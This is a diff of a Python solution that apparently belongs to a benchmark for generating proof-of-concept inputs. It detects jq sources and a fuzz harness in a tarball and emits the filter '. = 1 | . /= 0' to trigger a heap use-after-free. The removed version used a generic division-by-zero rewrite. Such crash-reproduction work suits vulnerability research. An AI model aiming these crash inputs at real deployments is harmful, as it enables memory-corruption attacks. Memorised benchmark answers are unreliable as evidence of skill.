@@ -1,129 +1,78 @@
-import os
 import tarfile
-import tempfile
-import re
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Try to analyze the source tarball to synthesize a PoC
+        """
+        Generate a PoC that triggers the heap use-after-free in compound division by zero.
+        """
+        # Filter that forces a numeric value then performs compound division by zero
+        filter_str = ". = 1 | . /= 0"
+        json_str = "1"
+
+        # Default output if we can't detect anything: just the filter
+        default_poc = filter_str.encode("utf-8")
+
         try:
-            tmpdir = tempfile.mkdtemp(prefix="poc_gen_")
-            try:
-                with tarfile.open(src_path, "r:*") as tf:
-                    def is_within_directory(directory: str, target: str) -> bool:
-                        abs_directory = os.path.abspath(directory)
-                        abs_target = os.path.abspath(target)
-                        try:
-                            common = os.path.commonpath([abs_directory, abs_target])
-                        except ValueError:
-                            return False
-                        return common == abs_directory
+            is_jq = False
+            harness_content = ""
 
-                    for member in tf.getmembers():
-                        member_path = os.path.join(tmpdir, member.name)
-                        if not is_within_directory(tmpdir, member_path):
-                            continue
-                        try:
-                            tf.extract(member, path=tmpdir)
-                        except Exception:
-                            continue
-            except Exception:
-                # If extraction fails, fall back to generic PoC
-                return b"a=1;a/=0;"
-
-            best_content = None
-            best_score = None  # (priority, size)
-
-            script_like_ext = {
-                ".php", ".phpt", ".php3", ".php4", ".php5", ".phtml",
-                ".rb", ".js", ".jsx", ".ts", ".tsx",
-                ".py", ".pyw",
-                ".lua", ".wren", ".nut",
-                ".txt", ".src", ".code", ".script",
-                ".conf", ".cfg", ".ini",
-                ""
-            }
-            non_script_ext_bad = {
-                ".c", ".h", ".cpp", ".cc", ".cxx", ".hpp", ".hh", ".ipp",
-                ".java", ".go", ".cs", ".m", ".mm", ".swift", ".rs"
-            }
-
-            max_files = 2000
-            files_processed = 0
-
-            for root, dirs, files in os.walk(tmpdir):
-                if files_processed >= max_files:
-                    break
-                for name in files:
-                    if files_processed >= max_files:
-                        break
-                    path = os.path.join(root, name)
-                    rel = os.path.relpath(path, tmpdir).lower()
-                    parts = rel.replace("\\", "/").split("/")
-
-                    # Basic priority heuristic
-                    priority = 0
-                    for part in parts:
-                        if part in ("test", "tests", "testing"):
-                            priority -= 2
-                        elif part in ("example", "examples", "sample", "samples", "demo", "demos"):
-                            priority -= 1
-
-                    ext = os.path.splitext(name)[1].lower()
-                    if ext in script_like_ext:
-                        priority -= 1
-                    if ext in non_script_ext_bad:
-                        priority += 1
-
-                    try:
-                        size = os.path.getsize(path)
-                    except OSError:
+            with tarfile.open(src_path, "r:*") as tf:
+                for member in tf.getmembers():
+                    if not member.isfile():
                         continue
-                    if size <= 0 or size > 100 * 1024:
+
+                    name_lower = member.name.lower()
+                    if not name_lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
+                        continue
+
+                    f = tf.extractfile(member)
+                    if f is None:
                         continue
 
                     try:
-                        with open(path, "rb") as f:
-                            raw = f.read(100000)
-                    except OSError:
-                        continue
+                        text = f.read().decode("utf-8", "ignore")
+                    finally:
+                        f.close()
 
-                    if not raw:
-                        continue
+                    # Heuristics to detect jq sources
+                    if ("jq_init(" in text or "jq_state" in text or "jv_parse(" in text or
+                        "jq - command-line json processor" in text or "JQ_VERSION" in text):
+                        is_jq = True
 
-                    # Heuristic: mostly-text detection
-                    text_chars = sum(1 for b in raw if 9 <= b <= 13 or 32 <= b <= 126)
-                    if text_chars / float(len(raw)) < 0.85:
-                        continue
+                    # Try to find a fuzz harness using jq
+                    if "LLVMFuzzerTestOneInput" in text and ("jq_init(" in text or "jq_compile(" in text):
+                        harness_content = text
 
-                    try:
-                        text = raw.decode("utf-8", errors="ignore")
-                    except Exception:
-                        continue
+            if not is_jq:
+                # Unknown project, fall back to generic guess
+                return default_poc
 
-                    if "/=" not in text:
-                        continue
+            # Try to infer delimiter between program and JSON, if any
+            delim_char = None
+            if harness_content:
+                for line in harness_content.splitlines():
+                    if "memchr" in line:
+                        # Look for '\n' or '\0' in the memchr call
+                        if "\\n" in line or "'\\n'" in line or "\"\\n\"" in line:
+                            delim_char = "\n"
+                            break
+                        if "\\0" in line or "'\\0'" in line or "\"\\0\"" in line:
+                            delim_char = "\0"
+                            break
+                        # Fallback for memchr(data, 0, size)
+                        stripped = line.replace(" ", "")
+                        if "memchr(" in stripped and ",0," in stripped:
+                            delim_char = "\0"
+                            break
 
-                    files_processed += 1
+            # If we couldn't infer, assume NUL delimiter (common in fuzz harnesses)
+            if delim_char is None:
+                delim_char = "\0"
 
-                    score = (priority, size)
-                    if best_score is None or score < best_score:
-                        best_score = score
-                        best_content = text
-
-            if best_content:
-                content = best_content
-                new_content, n = re.subn(r"/=\s*[^;\n]*;", "/= 0;", content, count=1)
-                if n == 0:
-                    new_content, n = re.subn(r"/=\s*[^#\n]*", "/= 0", content, count=1)
-                if n == 0:
-                    content = content + "\na=1;a/=0;\n"
-                    return content.encode("utf-8", errors="ignore")
-                return new_content.encode("utf-8", errors="ignore")
+            poc_str = filter_str + delim_char + json_str
+            return poc_str.encode("utf-8")
 
         except Exception:
-            pass
-
-        # Fallback generic PoC: minimal compound division by zero
-        return b"a=1;a/=0;"
+            # On any failure, return the simple filter-only PoC
+            return default_poc
